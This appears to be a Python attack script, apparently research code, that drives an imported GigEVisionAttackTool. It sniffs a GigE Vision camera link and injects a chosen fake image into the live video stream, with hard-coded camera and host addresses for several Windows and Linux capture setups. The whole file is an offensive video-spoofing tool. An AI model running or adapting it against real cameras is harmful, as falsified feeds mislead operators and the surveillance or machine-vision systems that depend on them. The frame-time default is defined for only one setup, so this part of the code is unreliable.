import matplotlib.pyplot as plt
from scapy.fields import *
from scapy.all import (
    sendpfast,
)
from scapy.all import hexdump
from enum import Enum
import argparse
from pathlib import Path

from gige.gige_attack_tool import GigEVisionAttackTool
from gige.constansts import *
from gige.gige_constants import *


class Method(Enum):
    WINDOWS_VIMBA = 1
    WINDOWS_MATLAB_REC = 2
    WINDOWS_MATLAB_PREVIEW = 3
    LINUX_ROS = 4


# PARAMETERS
method = Method.WINDOWS_VIMBA
camera_mac = "00:0f:31:03:67:c4"
cp_mac = "00:18:7d:c8:e6:31"

if method == Method.WINDOWS_VIMBA:
    interface = "Ethernet 6"
    cp_ip = "192.168.1.100"
    camera_ip = "192.168.10.150"
    img_width = 1936
    img_height = 1216
    max_payload_bytes = 8963
    sendp_ampiric_frame_time = 0.13

elif method == Method.WINDOWS_MATLAB_REC:
    interface = "Ethernet 6"
    cp_ip = "192.168.1.100"
    camera_ip = "192.168.0.1"
    img_width = 1920
    img_height = 1080
    max_payload_bytes = 8950
elif method == Method.WINDOWS_MATLAB_PREVIEW:
    interface = "Ethernet 6"
    cp_ip = "192.168.1.100"
    camera_ip = "192.168.0.1"
    img_width = 1936
    img_height = 1216
    max_payload_bytes = 8950
elif method == Method.LINUX_ROS:
    interface = "enp1s0"


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--path", required=True, help="path to fake image")
    parser.add_argument(
        "-d", "--duration", type=float, default=5, help="duration of faking"
    )
    parser.add_argument(
        "-r",
        "--frame_rate",
        type=float,
        default=1 / sendp_ampiric_frame_time,
        help="stream frame rate",
    )

    args = parser.parse_args()
    path = Path(args.path)
    if not path.exists():
        parser.exit(1, message="The input image doesn't exist")
    args.path = str(path.resolve())
    return args


def main():
    args = parse_args()
    link = GigEVisionAttackTool(interface=interface)
    link.sniff_link_parameters()
    link.fake_still_image(
        args.path,
        duration=args.duration,
        injection_effective_frame_rate=args.frame_rate,
    )


if __name__ == "__main__":
    main()
